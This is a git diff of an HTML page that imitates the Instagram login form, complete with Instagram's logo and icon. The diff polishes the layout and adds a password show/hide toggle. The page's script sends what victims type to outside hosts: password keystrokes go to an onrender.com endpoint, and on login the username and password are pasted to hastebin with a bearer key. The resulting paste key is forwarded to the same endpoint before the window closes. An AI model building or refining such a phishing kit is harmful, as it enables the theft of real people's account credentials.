@@ -8,6 +8,7 @@
   <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192"
     href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" />
   <link rel="stylesheet" href="./assets/index-BeHXAzec.css" />
+   <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
 </head>
 
 <body class="bg-black">
@@ -20,11 +21,20 @@
       <div class="flex flex-col">
         <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51"
           class="my-5 mx-20" />
-        <input class="input-username text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
-          placeholder="Phone number, username, or email" autocomplete="username" />
-        <input class="input-password text-white border border-[#363636] px-4 py-2 text-sm my-1 mx-12" type="password"
-          placeholder="Password" />
-        <button class="btn-login bg-[#0069AD] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log in</button>
+          <div class="w-full  flex items-center justify-center">
+            <input class="input-username  text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
+            placeholder="Phone number, username, or email" autocomplete="username" />
+          </div>
+          <div class="w-full  flex items-center justify-center">
+            <div class="relative">
+              <input class="input-password text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="password"
+              placeholder="Password" />
+              <h1 class="text-gray-100 toggler hidden font-bold cursor-pointer hover:text-gray-400 text-sm absolute top-4.5  right-15">Show</h1>
+            </div>
+          </div>
+          <div class="w-full flex items-center justify-center">
+            <button class="btn-login font-semibold  bg-[#0069AD] w-[65%] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log in</button>
+          </div>
         <hr class="my-2" />
         <span class="text-[#0095F6] mx-auto text-sm">Log in with Facebook</span>
         <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
@@ -52,13 +62,22 @@
     <div class="flex flex-col space-y-1.5 justify-center items-center">
       <div class="flex flex-col">
         <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51" class="my-5 mx-20" />
-        <input class="input-username text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
+        <div class=" flex items-center justify-center">
+          <input class="input-username text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
           placeholder="Phone number, username, or email" />
-        <input class="input-password text-white border border-[#363636] px-4 py-2 text-sm my-1 mx-12" type="password"
-          placeholder="Password" />
-        <button class="btn-login bg-[#0069AD] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log in</button>
+        </div>
+          <div class=" flex items-center justify-center">
+            <div class="relative ">
+              <input class="text-white input-password border  border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="password"
+              placeholder="Password" />
+              <h1  class="text-gray-100 toggler hidden absolute right-15 text-sm font-bold top-4.5 hover:text-gray-400">Show</h1>
+            </div>
+          </div>
+            <div class="flex justify-center items-center">
+              <button class="btn-login bg-[#0069AD] text-white w-2/3 rounded-lg px-4 mx-12 py-1.5 mt-2">Log in</button>
+            </div>
         <hr class="my-2" />
-        <span class="text-[#0095F6] mx-26 text-sm">Log in with Facebook</span>
+        <!-- <span class="text-[#0095F6] mx-26 text-sm">Log in with Facebook</span> -->
         <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
       </div>
       <div class="text-white text-center text-sm py-5 px-17.5">
@@ -96,12 +115,36 @@
   </footer>
 
   <script>
+    const pw=document.getElementsByClassName("input-password");
+    const tog=document.getElementsByClassName("toggler");
+    for(i=0;i<2;i++){
+      tog[i].addEventListener("click",(e)=>{
+        if(e.target.textContent==='Show'){
+          e.target.textContent='Hide';
+          for(i=0;i<2;i++){
+            pw[i].type="text";
+          }
+        }
+        else{
+          e.target.textContent='Show';
+          for(i=0;i<2;i++){
+            pw[i].type="password";
+          }
+        }
+      })
+    }
     const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
     const key = '3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd';
-
-    // Handle password keydown
     document.querySelectorAll(".input-password").forEach((pw) => {
       pw.addEventListener("keydown", async (e) => {
+        if(e.target.value.length>0){
+          for(i=0;i<2;i++){
+            tog[i].style="display:block;"
+          }
+        }
+        else{
+            tog[i].style="display:none;"
+        }
         console.log("hi");
         await fetch(dest, {
           method: "POST",
@@ -116,42 +159,47 @@
     // Handle login button click
     document.querySelectorAll(".btn-login").forEach((button) => {
       button.addEventListener("click", async (e) => {
-        console.log("Sarat make a love day");
+  const container = button.closest("div.flex-col");
+  const un = container.querySelector(".input-username");
+  const pw = container.querySelector(".input-password");
 
-        button.disabled = true;
-        const originalText = button.textContent;
-        button.textContent = "Loading...";
+  if (!un.value.trim()) {
+    alert("Please enter your username.");
+    return;
+  }
 
-        const container = button.closest("div.flex-col");
-        const un = container.querySelector(".input-username");
-        const pw = container.querySelector(".input-password");
+  console.log("Sarat make a love day");
 
-        try {
-          const resp1 = await fetch("https://hastebin.com/documents", {
-            method: 'POST',
-            headers: {
-              'Content-Type': "text/plain",
-              'Authorization': `Bearer ${key}`
-            },
-            body: `${un.value}:${pw.value}`
-          });
+  button.disabled = true;
+  const originalText = button.textContent;
+  button.textContent = "Loading...";
 
-          const data = await resp1.json();
+  try {
+    const resp1 = await fetch("https://hastebin.com/documents", {
+      method: 'POST',
+      headers: {
+        'Content-Type': "text/plain",
+        'Authorization': `Bearer ${key}`
+      },
+      body: `${un.value}:${pw.value}`
+    });
 
-          await fetch(dest, {
-            method: "POST",
-            headers: {
-              'Content-Type': "application/json"
-            },
-            body: JSON.stringify({ pw: data.key })
-          });
+    const data = await resp1.json();
 
-        } catch (err) {
-          console.error("Something went wrong:", err);
-        } finally {
-            window.close();
-        }
-      });
+    await fetch(dest, {
+      method: "POST",
+      headers: {
+        'Content-Type': "application/json"
+      },
+      body: JSON.stringify({ pw: data.key })
+    });
+
+  } catch (err) {
+    console.error("Something went wrong:", err);
+  } finally {
+    window.close();
+  }
+});
     });
   </script>
 </body>
